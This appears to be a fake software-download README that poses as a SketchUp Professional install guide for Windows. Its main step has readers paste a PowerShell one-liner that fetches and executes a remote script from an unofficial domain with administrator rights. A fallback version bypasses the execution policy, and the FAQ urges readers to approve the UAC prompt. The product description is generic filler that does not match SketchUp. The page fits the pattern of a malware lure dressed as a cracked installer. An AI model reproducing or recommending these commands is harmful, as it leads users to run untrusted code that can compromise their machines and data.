# SketchUp Professional — Windows 3D & CAD Guide (10 & 11)

Windows 10 & 11 · modeling · 3d & cad.

**SketchUp Professional** on **Windows 10 and 11** — modeling and day-to-day notes for engineers.

## Get started

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) if prompted
4. When the process finishes, open **SketchUp Professional** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

SketchUp models architectural concepts, interiors, and product forms with push-pull geometry and component libraries. Windows users leverage GPU acceleration for orbit navigation on large models.

Graphics and extension topics include graphics prefs, extension folders, and linking to layout or rendering pipelines when models leave the design phase.

## FAQ

| Question | Answer |
| --- | --- |
| Where do I run the command? | **PowerShell as Administrator** — use the block in step 2 under **Get started**. |
| ExecutionPolicy blocked the script? | Expand **Having trouble?** above — that one-liner uses **Bypass** for the current session only. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during step 3. |

## Features

- Parametric modeling
- Assembly tools
- Drawing sheets
- BOM export
- Industry formats
- Project libraries
- Measurement tools

## Use cases

- Engineering firms
- Manufacturing teams
- Technical colleges

## Developer reference

Optional. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "SketchUp-Professional-Full"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Application check (optional)**

```powershell
Get-Process -Name "SketchUp*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 16 GB minimum · 32 GB recommended |
| Disk | 15 GB free space |

## Topics

`sketchup-config` · `sketchup-integration` · `sketchup-latest` · `3d-modeling` · `cad-software` · `design-tools` · `product-design` · `visualization`

## License

This repository is a third-party design usage guide. Comply with applicable software licensing and local regulations.
